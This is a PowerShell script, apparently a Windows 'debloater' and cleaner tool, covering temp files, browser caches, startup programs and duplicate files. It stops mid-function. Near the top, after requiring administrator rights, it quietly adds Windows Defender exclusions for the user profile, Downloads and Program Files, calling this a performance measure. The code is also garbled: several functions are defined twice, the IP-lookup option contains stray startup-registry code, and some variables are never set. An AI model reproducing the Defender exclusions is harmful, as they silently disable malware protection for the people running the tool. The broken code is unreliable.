<#
==============================================================================
                        DEBLOATER TOOL v2.0
                        Advanced System Cleaner & Optimizer

                        Author: ! Star
                        Repository: https://github.com/5t42/DeBloater

                        Features:
                        - Temporary files cleanup
                        - Browser cache management  
                        - Memory optimization
                        - Startup programs management
                        - Advanced program uninstaller
                        - Duplicate file finder
                        - System optimization tools
==============================================================================
#>

#region SCRIPT INITIALIZATION & SECURITY CHECKS
# ============================================================================
# SCRIPT INITIALIZATION & SECURITY CHECKS
# ============================================================================

# Check if script is running with Administrator privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "ERROR: This script must be run as Administrator!" -ForegroundColor Red
    Wait-ForUser "Press Enter to exit..."
    exit
}

# Configure PowerShell preferences for better performance
$ProgressPreference = 'SilentlyContinue'
Clear-Host

# Add Windows Defender exclusions for better performance
try {
    Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:ProgramFiles(x86)" -ErrorAction SilentlyContinue
} catch {
    # Silently continue if Windows Defender is not available
}
#endregion

#region GLOBAL VARIABLES
# ============================================================================
# GLOBAL VARIABLES
# ============================================================================

# Store duplicate file finder results globally
$script:LastDuplicateResults = @()
#endregion

#region CORE UTILITY FUNCTIONS
# ============================================================================
# CORE UTILITY FUNCTIONS
# ============================================================================

function Show-Header {
    <#
    .SYNOPSIS
        Displays the application header with branding and description
    .DESCRIPTION
        Shows a formatted header with application name, version, author, and usage description
    #>

    Write-Host ""
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host "         Debloater Tool v2.0          " -ForegroundColor Green
    Write-Host "          By ! Star                   " -ForegroundColor Yellow
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Description: Advanced system cleaner and optimizer tool." -ForegroundColor Magenta
    Write-Host "Usage: Select options from the menu for system optimization." -ForegroundColor Magenta
    Write-Host ""
}

function Wait-ForUser {
    <#
    .SYNOPSIS
        Pauses script execution and waits for user input
    .PARAMETER msg
        Custom message to display to the user
    #>
    param([string]$msg = "Press Enter to continue...")

    Write-Host ""
    Read-Host $msg | Out-Null
}

# Create compatibility alias for existing code
Set-Alias -Name Pause-For-User -Value Wait-ForUser

function Show-MenuWithKeyboard {
    <#
    .SYNOPSIS
        Displays an interactive menu with keyboard navigation
    .DESCRIPTION
        Creates a navigable menu using arrow keys with color-coded options
    .PARAMETER MenuItems
        Array of menu items with Number, Text, and Color properties
    .PARAMETER Title
        Title to display above the menu
    .PARAMETER DefaultSelection
        Default selected item index
    #>
    param(
        [array]$MenuItems,
        [string]$Title = "Select an option:",
        [int]$DefaultSelection = 0
    )

    $selectedIndex = $DefaultSelection
    $maxIndex = $MenuItems.Count - 1

    while ($true) {
        Clear-Host
        Show-Header

        Write-Host $Title -ForegroundColor Cyan
        Write-Host ""

        # Display menu items with highlighting for selected item
        for ($i = 0; $i -lt $MenuItems.Count; $i++) {
            $item = $MenuItems[$i]
            if ($i -eq $selectedIndex) {
                Write-Host ">> " -NoNewline -ForegroundColor Yellow
                Write-Host "$($item.Number). $($item.Text)" -ForegroundColor $item.Color -BackgroundColor DarkBlue
            } else {
                Write-Host "   $($item.Number). $($item.Text)" -ForegroundColor $item.Color
            }
        }

        Write-Host ""
        Write-Host "Use ↑↓ arrow keys to navigate, Enter to select, or type number directly:" -ForegroundColor Gray

        # Wait for key input
        while (-not $Host.UI.RawUI.KeyAvailable -and -not [Console]::KeyAvailable) {
            Start-Sleep -Milliseconds 50
        }

        $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

        # Handle keyboard navigation
        switch ($key.VirtualKeyCode) {
            38 { # Up arrow
                $selectedIndex = if ($selectedIndex -eq 0) { $maxIndex } else { $selectedIndex - 1 }
            }
            40 { # Down arrow
                $selectedIndex = if ($selectedIndex -eq $maxIndex) { 0 } else { $selectedIndex + 1 }
            }
            13 { # Enter key
                return $MenuItems[$selectedIndex].Number
            }
            27 { # Escape key
                return '0'
            }
            default {
                # Handle direct number input
                $numChar = $key.Character
                if ($numChar -match '^[0-9]$') {
                    $matchingItem = $MenuItems | Where-Object { $_.Number -eq $numChar }
                    if ($matchingItem) {
                        return $numChar
                    }
                }
            }
        }
    }
}

function Show-Header {
    Write-Host ""
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host "         Cleaner Tool v1.0          " -ForegroundColor Green
    Write-Host "          By --- Unknown :(                " -ForegroundColor Yellow
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Description: Cleans temp files, optimizes system, clears browser cache." -ForegroundColor Magenta
    Write-Host "Usage: The script will guide you through comfy cleanup options." -ForegroundColor Magenta
    Write-Host ""
}

function Wait-ForUser ($msg = "Press Enter to continue...") {
    Write-Host ""
    Read-Host $msg | Out-Null
}

# Alias for compatibility with existing calls
Set-Alias -Name Pause-For-User -Value Wait-ForUser

function Show-MenuWithKeyboard {
    param(
        [array]$MenuItems,
        [string]$Title = "Select an option:",
        [int]$DefaultSelection = 0
    )

    $selectedIndex = $DefaultSelection
    $maxIndex = $MenuItems.Count - 1

    while ($true) {
        Clear-Host
        Show-Header

        Write-Host $Title -ForegroundColor Cyan
        Write-Host ""

        for ($i = 0; $i -lt $MenuItems.Count; $i++) {
            $item = $MenuItems[$i]
            if ($i -eq $selectedIndex) {
                Write-Host ">> " -NoNewline -ForegroundColor Yellow
                Write-Host "$($item.Number). $($item.Text)" -ForegroundColor $item.Color -BackgroundColor DarkBlue
            } else {
                Write-Host "   $($item.Number). $($item.Text)" -ForegroundColor $item.Color
            }
        }

        Write-Host ""
        Write-Host "Use ↑↓ arrow keys to navigate, Enter to select, or type number directly:" -ForegroundColor Gray

        # Check if a key is available
        while (-not $Host.UI.RawUI.KeyAvailable -and -not [Console]::KeyAvailable) {
            Start-Sleep -Milliseconds 50
        }

        $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

        switch ($key.VirtualKeyCode) {
            38 { # Up arrow
                $selectedIndex = if ($selectedIndex -eq 0) { $maxIndex } else { $selectedIndex - 1 }
            }
            40 { # Down arrow
                $selectedIndex = if ($selectedIndex -eq $maxIndex) { 0 } else { $selectedIndex + 1 }
            }
            13 { # Enter
                return $MenuItems[$selectedIndex].Number
            }
            27 { # Escape
                return '0'
            }
            default {
                # Check if it's a number key
                $numChar = $key.Character
                if ($numChar -match '^[0-9]$') {
                    $matchingItem = $MenuItems | Where-Object { $_.Number -eq $numChar }
                    if ($matchingItem) {
                        return $numChar
                    }
                }
            }
        }
    }
}
#endregion

#region DUPLICATE FILE FINDER FUNCTIONS
# ============================================================================
# DUPLICATE FILE FINDER FUNCTIONS
# ============================================================================

function Get-FileHash-MD5 {
    <#
    .SYNOPSIS
        Calculates MD5 hash for a specific file
    .DESCRIPTION
        Generates MD5 hash for file comparison to detect exact duplicates
    .PARAMETER FilePath
        Full path to the file to hash
    .RETURNS
        MD5 hash string or null if file cannot be accessed
    #>
    param([string]$FilePath)

    try {
        $hash = Get-FileHash -Path $FilePath -Algorithm MD5
        return $hash.Hash
    } catch {
        # Return null if file cannot be accessed (locked, permissions, etc.)
        return $null
    }
}

function Find-DuplicateFiles {
    <#
    .SYNOPSIS
        Scans specified path for duplicate files
    .DESCRIPTION
        Uses two-phase approach: first groups by file size, then compares MD5 hashes
        for files with identical sizes to identify true duplicates
    .PARAMETER Path
        Root path to scan for duplicate files
    .PARAMETER Recursive
        Switch to enable recursive scanning of subdirectories
    .RETURNS
        Array of duplicate file groups with hash, size, and file information
    #>
    param(
        [string]$Path,
        [switch]$Recursive
    )

    Write-Host "Scanning files..." -ForegroundColor Cyan

    # Phase 1: Collect all files in the specified path
    $files = if ($Recursive) {
        Get-ChildItem -Path $Path -File -Recurse -ErrorAction SilentlyContinue
    } else {
        Get-ChildItem -Path $Path -File -ErrorAction SilentlyContinue
    }

    # Early exit if no files found
    if ($files.Count -eq 0) {
        Write-Host "No files found to scan." -ForegroundColor Yellow
        return @()
    }

    Write-Host "Found $($files.Count) files. Analyzing..." -ForegroundColor Green

    # Phase 2: Group files by size (fast pre-filtering)
    # Only files with identical sizes can be duplicates
    $sizeGroups = $files | Group-Object Length | Where-Object { $_.Count -gt 1 -and $_.Name -gt 0 }

    if ($sizeGroups.Count -eq 0) {
        Write-Host "No potential duplicates found (by size)." -ForegroundColor Green
        return @()
    }

    # Phase 3: Compare files with identical sizes using MD5 hash
    $duplicateGroups = @()
    $totalGroups = $sizeGroups.Count
    $currentGroup = 0

    foreach ($sizeGroup in $sizeGroups) {
        $currentGroup++
        $percentComplete = [Math]::Round(($currentGroup / $totalGroups) * 100)
        Write-Progress -Activity "Finding duplicates" -Status "Checking group $currentGroup of $totalGroups" -PercentComplete $percentComplete

        # Calculate hash for each file in the size group
        $hashGroups = @{}
        foreach ($file in $sizeGroup.Group) {
            $hash = Get-FileHash-MD5 -FilePath $file.FullName
            if ($hash) {
                if (-not $hashGroups.ContainsKey($hash)) {
                    $hashGroups[$hash] = @()
                }
                $hashGroups[$hash] += $file
            }
        }

        # Collect groups with actual duplicates (same hash = identical content)
        foreach ($hashGroup in $hashGroups.Values) {
            if ($hashGroup.Count -gt 1) {
                $duplicateGroups += @{
                    Hash = (Get-FileHash-MD5 -FilePath $hashGroup[0].FullName)
                    Size = $hashGroup[0].Length
                    Files = $hashGroup
                    Count = $hashGroup.Count
                }
            }
        }
    }

    Write-Progress -Activity "Finding duplicates" -Completed

    # Store results globally for later use
    $script:LastDuplicateResults = $duplicateGroups
    return $duplicateGroups
}

function Show-DuplicateResults {
    param([array]$Duplicates)

    if ($Duplicates.Count -eq 0) {
        Write-Host " No duplicate files found!" -ForegroundColor Green
        return
    }

    $totalDuplicates = ($Duplicates | Measure-Object -Property Count -Sum).Sum - $Duplicates.Count
    $totalWastedSpace = 0

    foreach ($group in $Duplicates) {
        $wastedSpace = ($group.Count - 1) * $group.Size
        $totalWastedSpace += $wastedSpace
    }

    Write-Host ""
    Write-Host "========= Duplicate File Results =========" -ForegroundColor Cyan
    Write-Host "Duplicate groups found: $($Duplicates.Count)" -ForegroundColor Yellow
    Write-Host "Total duplicate files: $totalDuplicates" -ForegroundColor Yellow
    Write-Host "Wasted space: $([math]::Round($totalWastedSpace/1MB,2)) MB" -ForegroundColor Red
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host ""

    $action = Read-Host "View detailed results? (y/n)"
    if ($action -eq 'y' -or $action -eq 'Y') {
        Show-DuplicateGroups -Duplicates $Duplicates
    }
}

function Show-DuplicateGroups {
    param([array]$Duplicates)

    if ($Duplicates.Count -eq 0) {
        Write-Host "No duplicate groups to display." -ForegroundColor Yellow
        return
    }

    $groupIndex = 1
    foreach ($group in $Duplicates) {
        Write-Host ""
        Write-Host "--- Duplicate Group $groupIndex ---" -ForegroundColor Cyan
        Write-Host "Size: $([math]::Round($group.Size/1KB,2)) KB | Count: $($group.Count) files" -ForegroundColor Gray

        for ($i = 0; $i -lt $group.Files.Count; $i++) {
            $file = $group.Files[$i]
            $color = if ($i -eq 0) { "Green" } else { "White" }
            $marker = if ($i -eq 0) { "[KEEP]" } else { "[DUPLICATE]" }
            Write-Host "$($i+1). $marker $($file.FullName)" -ForegroundColor $color
            Write-Host "    Modified: $($file.LastWriteTime)" -ForegroundColor Gray
        }

        Write-Host ""
        Write-Host "Actions for Group $groupIndex" -ForegroundColor Yellow
        Write-Host "1. Delete all duplicates (keep first)" -ForegroundColor Red
        Write-Host "2. Delete specific files" -ForegroundColor Yellow
        Write-Host "3. Skip this group" -ForegroundColor Green

        $choice = Read-Host "Choose action (1-3)"
        switch ($choice) {
            '1' {
                # Delete all duplicates except first
                $confirm = Read-Host "Delete $($group.Count - 1) duplicate files? (y/n)"
                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                    $deleted = 0
                    for ($i = 1; $i -lt $group.Files.Count; $i++) {
                        try {
                            Remove-Item $group.Files[$i].FullName -Force -ErrorAction Stop
                            Write-Host "SUCCESS: Deleted: $($group.Files[$i].Name)" -ForegroundColor Green
                            $deleted++
                        } catch {
                            Write-Host "ERROR: Failed to delete: $($group.Files[$i].Name)" -ForegroundColor Red
                        }
                    }
                    Write-Host "Deleted $deleted duplicate files from group $groupIndex" -ForegroundColor Green
                }
            }
            '2' {
                # Delete specific files
                Write-Host "Enter file numbers to delete (comma-separated, e.g., 2,3):"
                $selection = Read-Host "Numbers"
                if ($selection.Trim() -ne '') {
                    $indices = $selection -split "," | ForEach-Object { ([int]$_.Trim()) - 1 }
                    $validIndices = $indices | Where-Object { $_ -ge 0 -and $_ -lt $group.Files.Count }

                    if ($validIndices.Count -gt 0) {
                        $confirm = Read-Host "Delete $($validIndices.Count) selected files? (y/n)"
                        if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                            foreach ($index in $validIndices) {
                                try {
                                    Remove-Item $group.Files[$index].FullName -Force -ErrorAction Stop
                                    Write-Host "SUCCESS: Deleted: $($group.Files[$index].Name)" -ForegroundColor Green
                                } catch {
                                    Write-Host "ERROR: Failed to delete: $($group.Files[$index].Name)" -ForegroundColor Red
                                }
                            }
                        }
                    }
                }
            }
            '3' {
                Write-Host "Skipped group $groupIndex" -ForegroundColor Gray
            }
        }

        $groupIndex++

        if ($groupIndex -le $Duplicates.Count) {
            $continue = Read-Host "`nContinue to next group? (y/n)"
            if ($continue -ne 'y' -and $continue -ne 'Y') {
                break
            }
        }
    }
}
#endregion

#region SYSTEM STARTUP & EXTERNAL TOOLS
# ============================================================================
# SYSTEM STARTUP & EXTERNAL TOOLS
# ============================================================================

Show-Header

do {
    Write-Host ""
    Write-Host "What would you like to do?" -ForegroundColor Cyan
    Write-Host "1. Clear Temporary Files " -NoNewline -ForegroundColor White
    Write-Host "( Choose Folders )" -ForegroundColor Magenta
    Write-Host "2. Do Nothing " -NoNewline -ForegroundColor White
    Write-Host "( Exit )" -ForegroundColor Magenta
    Write-Host "3. Full Cleanup " -NoNewline -ForegroundColor White
    Write-Host "( Temp, Local Temp, Windows Temp, Prefetch )" --ForegroundColor Magenta
    Write-Host "4. Clear Browser Cache " -NoNewline -ForegroundColor White
    Write-Host "( Firefox, Chrome, Edge )" -ForegroundColor Magenta
    Write-Host "5. Clear Recycle Bin" -ForegroundColor White
    Write-Host "6. Memory Optimizer " -NoNewline -ForegroundColor White
    Write-Host "( Clear Cached Memory )" -ForegroundColor Magenta
    Write-Host "7. Get Public IP Address with Details" -ForegroundColor White
    Write-Host "8. Startup Manager " -NoNewline -ForegroundColor White
    Write-Host "( Enable/Disable Startup Programs )" -ForegroundColor Magenta
    Write-Host "9. Advanced Program Uninstaller" -ForegroundColor White
    Write-Host "10. Complete App Remover " -NoNewline -ForegroundColor White
    Write-Host "( Like Revo Uninstaller )" -ForegroundColor Magenta
    Write-Host "11. Duplicate File Finder " -NoNewline -ForegroundColor White
    Write-Host "( Find & Remove Duplicates )" -ForegroundColor Magenta
    $choice = Read-Host "`nEnter 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 or 0 to exit"
    if ($choice -eq '0') { break }

    switch ($choice) {
        
        #region OPTION 1 - TEMPORARY FILES CLEANUP
        '1' {
            # Clear Temporary Files - User selects specific folders
            Write-Host ""
            Write-Host "Select folders to clear (or enter 0 to return to main menu):" -ForegroundColor Cyan
            Write-Host "1. TEMP folder" -ForegroundColor Green
            Write-Host "2. Local Temp" -ForegroundColor Green
            Write-Host "3. Windows Temp" -ForegroundColor Green
            Write-Host "4. Prefetch" -ForegroundColor Green
            $selection = Read-Host "Enter numbers separated by commas (e.g., 1,3,4) or 0 to return"
            if ($selection -eq '0') { continue }
            $selectedIndexes = $selection -split "," | ForEach-Object { $_.Trim() }
            $folders = @()
            foreach ($i in $selectedIndexes) {
                switch ($i) {
                    "1" { $folders += $env:TEMP }
                    "2" { $folders += "$env:USERPROFILE\AppData\Local\Temp" }
                    "3" { $folders += "C:\Windows\Temp" }
                    "4" { $folders += "C:\Windows\Prefetch" }
                }
            }
            if ($folders.Count -eq 0) {
                Write-Host "No folders selected. Returning to menu." -ForegroundColor Yellow
                Pause-For-User
                break
            }
            Write-Host "Starting cleanup in 3 seconds..." -ForegroundColor Magenta
            Start-Sleep -Seconds 3
            $startTime = Get-Date
            $spaceBefore = (Get-PSDrive C).Free
            Write-Host "Free space before cleanup: $([math]::Round($spaceBefore/1MB,2)) MB" -ForegroundColor Cyan
            $totalDeleted = 0
            foreach ($path in $folders) {
                if (Test-Path $path) {
                    $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                    $count = $items.Count
                    $progress = 0
                    foreach ($item in $items) {
                        if (Test-Path $item.FullName) {
                            try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                            $progress++
                            $totalDeleted++
                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
                        }
                    }
                }
            }
            $spaceAfter = (Get-PSDrive C).Free
            $endTime = Get-Date
            $duration = ($endTime - $startTime).TotalSeconds
            Write-Host "Temporary files cleared." -ForegroundColor Green
            Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan
            $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
            Write-Host ""
            Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
            Write-Host "Files deleted: $totalDeleted" -ForegroundColor Yellow
            Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
            Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
            Write-Host "==================================" -ForegroundColor Cyan
            Pause-For-User
        }
        #endregion

        #region OPTION 2 - EXIT APPLICATION
        '2' {
            # Exit application with friendly message
            Write-Host "Nothing done. Have a comfy day! :)" -ForegroundColor Green
            break
        }
        #endregion

        #region OPTION 3 - FULL CLEANUP
        '3' {
            Write-Host "You can enter 0 at any time to return to the main menu." -ForegroundColor Yellow
            $folders = @(
                $env:TEMP, 
                "$env:USERPROFILE\AppData\Local\Temp", 
                "C:\Windows\Temp", 
                "C:\Windows\Prefetch"
            )
            $cancel = $false
            foreach ($path in $folders) {
                if ($cancel) { break }
                if (Test-Path $path) {
                    $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                    $count = $items.Count
                    $progress = 0
                    foreach ($item in $items) {
                        if (Test-Path $item.FullName) {
                            # Check for cancel
                            if ($Host.UI.RawUI.KeyAvailable) {
                                $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
                                if ($key.Character -eq '0') { $cancel = $true; break }
                            }
                            try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                            $progress++
                            $totalDeleted++
                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
                        }
                    }
                }
            }
            if ($cancel) {
                Write-Host "Operation cancelled. Returning to main menu." -ForegroundColor Yellow
                continue
            }
            $spaceAfter = (Get-PSDrive C).Free
            $endTime = Get-Date
            $duration = ($endTime - $startTime).TotalSeconds
            Write-Host "Full cleanup done." -ForegroundColor Green
            Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan
            $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
            Write-Host ""
            Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
            Write-Host "Files deleted: $totalDeleted" -ForegroundColor Yellow
            Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
            Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
            Write-Host "==================================" -ForegroundColor Cyan
            Pause-For-User
        }
        #endregion

        #region OPTION 4 - BROWSER CACHE CLEANUP
        '4' {
            Write-Host ""
            Write-Host "Select browser to clear cache (or enter 0 to return to main menu):" -ForegroundColor Cyan
            Write-Host "1. Chrome" -ForegroundColor Green
            Write-Host "2. Edge" -ForegroundColor Green
            Write-Host "3. Firefox" -ForegroundColor Green
            $browserChoice = Read-Host "Enter 1, 2, 3 or 0 to return"
            if ($browserChoice -eq '0') { continue }
            switch ($browserChoice) {
                "1" {
                    $chromeCache = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
                    if (Test-Path $chromeCache) { 
                        Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
                        Write-Host "Chrome cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Chrome cache not found." -ForegroundColor Yellow
                    }
                }
                "2" {
                    $edgeCache = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache"
                    if (Test-Path $edgeCache) { 
                        Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
                        Write-Host "Edge cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Edge cache not found." -ForegroundColor Yellow
                    }
                }
                "3" {
                    $firefoxCache = "$env:APPDATA\Mozilla\Firefox\Profiles"
                    $cacheItems = Get-ChildItem $firefoxCache -Recurse -Include cache2 -ErrorAction SilentlyContinue
                    if ($cacheItems) {
                        $cacheItems | ForEach-Object {
                            Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
                        }
                        Write-Host "Firefox cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Firefox cache not found." -ForegroundColor Yellow
                    }
                }
                default { Write-Host "No valid browser selected." -ForegroundColor Yellow }
            }
            Pause-For-User
        }
        '5' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $recycleInput = Read-Host "Press Enter to clear all recycle bins or 0 to return"
            if ($recycleInput -eq '0') { continue }
            $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
            foreach ($drive in $drives) {
                try {
                    Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
                } catch {}
            }
            Write-Host "Recycle Bin cleared." -ForegroundColor Green
            Pause-For-User
        }
        '6' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $memInput = Read-Host "Press Enter to optimize memory or 0 to return"
            if ($memInput -eq '0') { continue }
            Write-Host "Optimizing memory..." -ForegroundColor Cyan
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
            Write-Host "Memory optimization completed." -ForegroundColor Green
            Pause-For-User
        }
        '7' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $ip = Read-Host "Enter the IP address you want to lookup (leave blank for your own IP, or 0 to return)"
            if ($ip -eq '0') { continue }
            if ([string]::IsNullOrWhiteSpace($ip)) {
                $url = "https://ipinfo.io/json"
            } else {
                $url = "https://ipinfo.io/$ip/json"
            }
            try {
                $response = Invoke-RestMethod -Uri $url -ErrorAction Stop
                Write-Host "========= Public IP Information =========" -ForegroundColor Cyan
                Write-Host "IP Address   : $($response.ip)" -ForegroundColor Yellow
                Write-Host "Hostname     : $($response.hostname)" -ForegroundColor Yellow
                Write-Host "City         : $($response.city)" -ForegroundColor Yellow
                Write-Host "Region       : $($response.region)" -ForegroundColor Yellow
                Write-Host "Country      : $($response.country)" -ForegroundColor Yellow
                Write-Host "Location     : $($response.loc)" -ForegroundColor Yellow
                Write-Host "Organization : $($response.org)" -ForegroundColor Yellow
                Write-Host "Postal Code  : $($response.postal)" -ForegroundColor Yellow
                Write-Host "=========================================" -ForegroundColor Cyan
                Write-Host "1. Disable (remove from startup)" -ForegroundColor Red
                Write-Host "2. Enable (add to startup)" -ForegroundColor Green
                $action = Read-Host "Choose action (1 or 2, or 0 to return)"
                if ($action -eq '0') { continue }
                if ($action -eq '1') {
                    try {
                        $regPaths = @(
                            'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
                            'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
                            'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
                        )
                        foreach ($reg in $regPaths) {
                            Remove-ItemProperty -Path $reg -Name $selectedItem.Name -ErrorAction SilentlyContinue
                        }
                        Write-Host "Startup item disabled (removed from registry)." -ForegroundColor Green
                    } catch {
                        Write-Host "Failed to disable startup item." -ForegroundColor Red
                    }
                } elseif ($action -eq '2') {
                    try {
                        $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
                        Set-ItemProperty -Path $regPath -Name $selectedItem.Name -Value $selectedItem.Command
                        Write-Host "Startup item enabled (added to current user startup)." -ForegroundColor Green
                    } catch {
                        Write-Host "Failed to enable startup item." -ForegroundColor Red
                    }
                } else {
                    Write-Host "Invalid action." -ForegroundColor Red
                }
            } catch {
                Write-Host "Failed to retrieve public IP information: $_" -ForegroundColor Red
            }
            Pause-For-User
        }
        '8' {
            Write-Host "`nStartup Manager" -ForegroundColor Cyan
            Write-Host "===============" -ForegroundColor Cyan
            Write-Host "Scanning startup programs..." -ForegroundColor Yellow

            $startupItems = @()

            # Get startup items from registry
            $regPaths = @(
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
                'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            )

            foreach ($regPath in $regPaths) {
                if (Test-Path $regPath) {
                    try {
                        Get-ItemProperty $regPath -ErrorAction SilentlyContinue | ForEach-Object {
                            $_.PSObject.Properties | Where-Object { $_.Name -ne 'PSPath' -and $_.Name -ne 'PSParentPath' -and $_.Name -ne 'PSChildName' -and $_.Name -ne 'PSDrive' -and $_.Name -ne 'PSProvider' } | ForEach-Object {
                                $startupItems += [PSCustomObject]@{
                                    Name = $_.Name
                                    Command = $_.Value
                                    Location = if ($regPath -like '*HKLM*') { 'System' } else { 'User' }
                                    RegPath = $regPath
                                    Status = 'Enabled'
                                }
                            }
                        }
                    } catch {}
                }
            }

            # Get startup folder items
            $startupFolders = @(
                "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
                "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
            )

            foreach ($folder in $startupFolders) {
                if (Test-Path $folder) {
                    Get-ChildItem $folder -ErrorAction SilentlyContinue | ForEach-Object {
                        $startupItems += [PSCustomObject]@{
                            Name = $_.BaseName
                            Command = $_.FullName
                            Location = if ($folder -like "*ProgramData*") { 'System Folder' } else { 'User Folder' }
                            RegPath = $folder
                            Status = 'Enabled'
                        }
                    }
                }
            }

            if ($startupItems.Count -eq 0) {
                Write-Host "No startup programs found." -ForegroundColor Yellow
                Pause-For-User
                continue
            }

            Write-Host "Found $($startupItems.Count) startup programs" -ForegroundColor Green
            Write-Host ""

            do {
                Write-Host "Startup Manager Options:" -ForegroundColor Cyan
                Write-Host "1. View all startup programs" -ForegroundColor Green
                Write-Host "2. Disable startup program" -ForegroundColor Red
                Write-Host "3. Enable startup program" -ForegroundColor Green
                Write-Host "4. Search startup programs" -ForegroundColor Blue
                Write-Host "5. Backup startup settings" -ForegroundColor Yellow
                Write-Host "0. Return to main menu" -ForegroundColor Gray

                $startupChoice = Read-Host "`nEnter choice (0-5)"

                switch ($startupChoice) {
                    '1' {
                        # View all startup programs
                        Write-Host "`nStartup Programs:" -ForegroundColor Cyan
                        Write-Host ("=" * 80) -ForegroundColor Cyan
                        Write-Host ("{0,-3} {1,-30} {2,-15} {3,-10} {4}" -f "No.", "Program Name", "Location", "Status", "Command") -ForegroundColor Yellow
                        Write-Host ("-" * 80) -ForegroundColor Gray

                        for ($i = 0; $i -lt $startupItems.Count; $i++) {
                            $item = $startupItems[$i]
                            $command = if ($item.Command.Length -gt 30) { $item.Command.Substring(0, 27) + "..." } else { $item.Command }
                            Write-Host ("{0,-3} {1,-30} {2,-15} {3,-10} {4}" -f ($i+1), $item.Name, $item.Location, $item.Status, $command) -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter program number for details (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $startupItems.Count) {
                                $selectedItem = $startupItems[$index]
                                Write-Host "`nProgram Details:" -ForegroundColor Cyan
                                Write-Host "Name: $($selectedItem.Name)" -ForegroundColor White
                                Write-Host "Command: $($selectedItem.Command)" -ForegroundColor White
                                Write-Host "Location: $($selectedItem.Location)" -ForegroundColor White
                                Write-Host "Registry Path: $($selectedItem.RegPath)" -ForegroundColor White
                                Write-Host "Status: $($selectedItem.Status)" -ForegroundColor White
                            }
                        }
                    }

                    '2' {
                        # Disable startup program
                        Write-Host "`nSelect program to DISABLE:" -ForegroundColor Red
                        for ($i = 0; $i -lt $startupItems.Count; $i++) {
                            Write-Host "$($i+1). $($startupItems[$i].Name) - $($startupItems[$i].Location)" -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter program number to disable (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $startupItems.Count) {
                                $selectedItem = $startupItems[$index]
                                $confirm = Read-Host "Disable '$($selectedItem.Name)' from startup? (y/n)"
                                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                    try {
                                        if ($selectedItem.Location -like "*Folder*") {
                                            # Move file to backup location or delete
                                            $backupPath = "$env:TEMP\StartupBackup"
                                            if (-not (Test-Path $backupPath)) { New-Item -Path $backupPath -ItemType Directory -Force | Out-Null }
